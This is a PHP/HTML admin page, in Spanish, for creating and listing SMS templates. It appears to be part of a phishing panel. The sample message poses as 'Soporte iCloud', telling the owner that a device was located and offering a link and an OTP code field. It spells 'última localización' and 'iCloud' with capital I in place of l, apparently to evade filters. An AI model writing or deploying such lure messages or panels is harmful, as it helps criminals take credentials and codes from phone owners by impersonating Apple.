<!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
   <!-- Content Header (Page header) -->
   <section class="content-header">
      <div class="container-fluid">
         <div class="row mb-2">
            <?php if($server['status_msg_notificacion'] == 1){ ?>
             <div class="col-sm-12">
              <div class="card">
               <div class="card-body">
                  <?php if(!empty($server['msg_notificacion'])): echo $server['msg_notificacion']; endif;?>
               </div>
             </div>
            </div>
            <?php } ?> 
            <div class="col-sm-6">
               <h1>Plantillas SMS</h1>
            </div>
            <div class="col-sm-6">
               <ol class="breadcrumb float-sm-right">
                  <li class="breadcrumb-item"><a href="#">Plantillas</a></li>
                  <li class="breadcrumb-item active">SMS</li>
               </ol>
            </div>
         </div>
      </div>
      <!-- /.container-fluid -->
   </section>
   <!-- Main content -->
  <section class="content">
      <div class="container-fluid">
         <div class="row">
            <div class="col-md-12">
               <div class="card card-info">
                  <div class="card-header">
                     <h3 class="card-title">Configuración</h3>
                  </div>
                  <div class="card-body" style="padding: 0.75rem!important;">
                     <form class="form-horizontal form-bordered form-smstemplate" method="post">
                    <div class="form-group row">
                        <label class="col-md-2 col-form-label">Titulo</label>
                        <div class="col-md-8">
                            <div class="input-group">
                               <div class="input-group-prepend" style="width: 100%;">
                                  <span class="input-group-text"><i class="fas fa-link"></i></span>
                                  <input type="text" class="form-control"  id="titulo" name = "titulo" placeholder="Dispositivo ubicado" >
                                </div>                              
                                <div class="invalid-tooltip">El campo es requerido.</div>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-md-2 col-form-label">Descripción</label>
                        <div class="col-md-8">
                            <div class="invalid-tooltip">El campo es requerido.</div>
                            <textarea class="form-control m-b-10" id="descripcion" rows="3" placeholder="Su dispositivo {{model}} ha sido ubicado hoy a la(s) {{time}} Ver uItima locaIizacion: {{link}} Soporte iCIoud"></textarea>
                            <br>

                            <div class="alert alert-success fade show" style=" color: white; background: #007bffc2;">
                                <span class="close" data-dismiss="alert" style="cursor: pointer;">×</span> Use <strong>{{model}}</strong> para incluir el modelo.
                                <br> Use <strong>{{device}}</strong> para incluir el usuario.
                                <br> Use <strong>{{time}}</strong> para icluir la hora.
                                <br> Use <strong>{{link}}</strong> para incluir el link.
                                <br> Use <strong>{{code}}</strong> para incluir el codigo (Especial para verificaciones OTP).
                                <br>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-md-2 col-form-label">
                            <button type="submit" class="btn btn-block btn-outline-primary">Guardar</button>
                        </label>
                      
                    </div>
                </form>

                <hr>
                <form class="form-horizontal form-bordered form-buscartemplate" method="post" style="padding-left: 0px!important;">
                    <div class="form-group row">
                        <div class="col-md-6" style="border-left: 0px!important; /*padding-left: 0px!important;*/">
                            <div class="row">
                                <div class="col-sm-9">
                                    <div class="input-group input-group-sm">
                                      <input type="text" class="form-control" id = "buscartemplate" placeholder="Titulo/Descripción">
                                      <div class="input-group-append">
                                        <div class="btn btn-primary" style="background-color: #28a745!important;">
                                          <i class="fas fa-search"></i>
                                        </div>
                                      </div>
                                    </div>
                                </div>                               
                            </div>
                        </div>
                    </div>
                </form>

                <br>

                 <div class="table-responsive">
                    <table class="table table-bordered m-b-0" id="table">
                        <thead>
                            <tr>
                                <th data-field="id" data-sortable="true">#</th>
                                <th data-field="titulo" data-sortable="true"><span>Titulo</span></th>
                                <th data-field="descripcion" data-sortable="true"><span>Descripción</span></th>
                                <th data-field="descripcion" data-sortable="true"><span>Acción</span></th>
                            </tr>
                        </thead>
                        <tbody id="bodyTable">
                            <div id="reloadIcloud"></div>

                        </tbody>
                    </table>

                </div>

                 <div class="modal fade" id="modalsmstemplates" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                   <div class="modal-dialog" role="document">
                     <div class="modal-content">
                      <div class="modal-header">
                            <h4 class="modal-title">SMS Templates</h4>
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                        </div>
                      <div class="modal-body">
                         <form class="form-horizontal form-bordered form-editsmstemplate" method="post">
                    <div class="form-group row">
                        <label class="col-md-2 col-form-label">Titulo</label>
                        <div class="col-md-8">
                            <div class="input-group">
                               <div class="input-group-prepend" style="width: 100%;">
                                  <span class="input-group-text"><i class="fas fa-link"></i></span>
                                  <input type="text" class="form-control" id="idtempsmsM" style="display: none;" />
                                  <input type="text" class="form-control"  id="tituloM" name = "tituloM" placeholder="Dispositivo ubicado" >
                                </div>                              
                                <div class="invalid-tooltip">El campo es requerido.</div>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-md-2 col-form-label">Descripción</label>
                        <div class="col-md-8">
                            <div class="invalid-tooltip">El campo es requerido.</div>
                            <textarea class="form-control m-b-10" id="descripcionM" rows="3" placeholder="Su dispositivo {{model}} ha sido ubicado hoy a la(s) {{time}} Ver uItima locaIizacion: {{link}} Soporte iCIoud"></textarea>
                            <br>

                            <div class="alert alert-success fade show">
                                <span class="close" data-dismiss="alert" style="cursor: pointer;">×</span> Use <strong>{{model}}</strong> para incluir el modelo.
                                <br> Use <strong>{{device}}</strong> para incluir el usuario.
                                <br> Use <strong>{{time}}</strong> para icluir la hora.
                                <br> Use <strong>{{link}}</strong> para incluir el link.
                                <br> Use <strong>{{code}}</strong> para incluir el codigo (Especial para verificaciones OTP).
                                <br>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-md-4 col-form-label">
                            <button type="submit" class="btn btn-block btn-outline-primary">Guardar</button>
                        </label>
                      
                    </div>
                </form>
                      </div>
                     </div>
                   </div>
                 </div>



                  </div>
                  <!-- /.card-body -->
               </div>
               <!-- /.card -->
            </div>
         </div>
      </div>


   </section>
   <!-- Control Sidebar -->
   <aside class="control-sidebar control-sidebar-dark">
      <!-- Control sidebar content goes here -->
   </aside>
   <!-- /.control-sidebar -->
   <!-- Main Footer -->
   <footer class="main-footer">
    <strong>Copyright &copy; <?php echo date('Y');  ?> <a href="<?php echo base_url();?>"><?php echo $server['descripcionserver']; ?></a>.</strong>
    Todos los derechos reservados
    <div class="float-right d-none d-sm-inline-block">
      <b>Version</b> 2.0
    </div>
  </footer>
</div>
<!-- ./wrapper -->
<!-- REQUIRED SCRIPTS -->
<!-- jQuery -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/select2/js/select2.full.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>/public/assets/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/moment/moment.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/inputmask/min/jquery.inputmask.bundle.min.js"></script>
<!-- date-range-picker -->
<script src="<?php echo base_url();?>/public/assets/plugins/daterangepicker/daterangepicker.js"></script>
<!-- bootstrap color picker -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-colorpicker/js/bootstrap-colorpicker.min.js"></script>
<!-- Tempusdominus Bootstrap 4 -->
<script src="<?php echo base_url();?>/public/assets/plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.min.js"></script>
<!-- Bootstrap Switch -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>/public/assets/dist/js/adminlte.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>/public/assets/dist/js/demo.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>/public/assets/plugins/chart.js/Chart.min.js"></script>
<!-- PAGE SCRIPTS -->
<!--<script src="<?php //echo base_url();?>/public/assets/dist/js/pages/dashboard2.js"></script>-->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src=".<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/servidor/smstemplates.js"></script>


<script type="text/javascript">

  $(document).ready(function() {

     setTimeout(function(){
       $(".theme-loader").fadeOut("slow");           
     }, 500)

    $("#title").html($("#title").html() + " .::. SMSPlantillas")
 
   $(".li-plantillassms").addClass('active')
   $(".li-config").addClass('active')
   $(".nav-treeview-config").css('display','block')
});
  
  
</script>


</body>
</html>